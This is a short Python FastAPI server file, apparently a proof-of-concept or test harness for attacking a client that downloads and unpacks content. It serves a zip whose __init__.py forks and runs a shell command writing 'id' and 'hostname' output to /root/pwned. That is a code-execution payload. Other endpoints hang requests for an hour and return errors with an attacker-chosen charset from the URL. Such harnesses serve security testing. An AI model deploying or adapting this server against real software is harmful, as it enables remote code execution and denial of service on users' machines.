import asyncio
import io
import zipfile

from fastapi import FastAPI, Response
from fastapi.responses import PlainTextResponse


def build_zip():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as z:
        z.writestr('__init__.py',
                   "import os\n"
                   "if os.fork() == 0:\n"
                   "    os.system('id > /root/pwned; hostname >> /root/pwned')\n"
                   "    os._exit(0)\n")
        z.writestr('page.html',
                   '<html><body><div id="main-content"><h1>Hello</h1>'
                   '<p>world</p></div></body></html>')
    return buf.getvalue()


ZIP = build_zip()
app = FastAPI()


@app.get('/payload.zip')
def payload():
    return Response(ZIP, media_type='application/zip')


@app.get('/md')
def md():
    return PlainTextResponse('# hello\n\nworld\n')


@app.post('/hang')
async def hang():
    await asyncio.sleep(3600)


@app.post('/err/{codec}')
def err(codec: str):
    return Response('boom', status_code=500,
                    media_type='text/plain; charset=%s' % codec)
